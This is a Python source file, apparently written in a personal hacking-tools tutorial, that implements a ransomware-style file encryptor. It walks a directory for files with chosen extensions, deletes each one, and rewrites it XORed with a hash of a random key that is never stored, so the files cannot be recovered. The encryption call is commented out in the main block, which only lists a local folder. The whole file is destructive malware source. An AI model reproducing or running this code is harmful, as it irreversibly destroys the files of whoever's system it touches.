import os
from hashlib import sha256
import string
import random
import sys

# This list contain all files that we will crypt contain
all_files = list()
# end_start = datetime.timestamp(datetime.today())
# print("Scan time: {} seconds".format(str(end_start)))

def generate_private_key():
    all_char = string.ascii_letters + string.digits + string.punctuation
    return ''.join(random.sample(all_char, 20))

def open_file(path, mode='r'):
    """ This method permit to read file """
    with open(path, mode) as content:
        return content.readlines()

def write_in_file(path, content):
    """ This method permit to read file """
    with open(path, "w+") as file:
        file.write(content)

def xor_cipher():
    """ This function use XOR method to crypt file """
    key = generate_private_key()
    keys = sha256(key.encode('utf-8')).digest()
    
    for i in range(len(all_files)):
        current_file_path = all_files[i]["path"] +"/"+ all_files[i]["file_name"]
        current_file_content = open_file(current_file_path, 'r')
        
        os.remove(current_file_path)

        with open(current_file_path, 'wb') as f_sortie:
            if len(current_file_content) != 0:
                all_content = [line.replace('\n', '') for line in current_file_content]
                counter = 0
                for item in all_content:
                    for i in range(len(item)):
                        char_code = ord(item[i])
                        mod_char_code = counter % len(keys)
                        code = bytes([char_code^keys[mod_char_code]])
                        f_sortie.write(code)
                        counter += 1
        
def search_files(path, extension):
    """ This function help you to get all files you want """
    for folder, sub_folder, files in os.walk(path):
        for item in range(len(files)):
            file_with_path = dict()
            if files[item].split(".")[1] in extension:
                file_with_path["path"] = folder
                file_with_path["file_name"] = files[item]
                all_files.append(file_with_path)

# search_files("C:/Users/Kassoum/Documents/tuto/Cyber security/codes/Hacking Tools/save", ["txt"])

if __name__ == '__main__':
    # xor_cipher()
    # print(all_files)
    with os.scandir("C:/Users/Kassoum/Documents/tuto/Cyber security/codes/Hacking Tools/save") as it:
        for i in it:
            print(f"{i.name} => {i.stat().st_ctime}")
            
    # list_dir = os.scandir()
    # print(list_dir)
    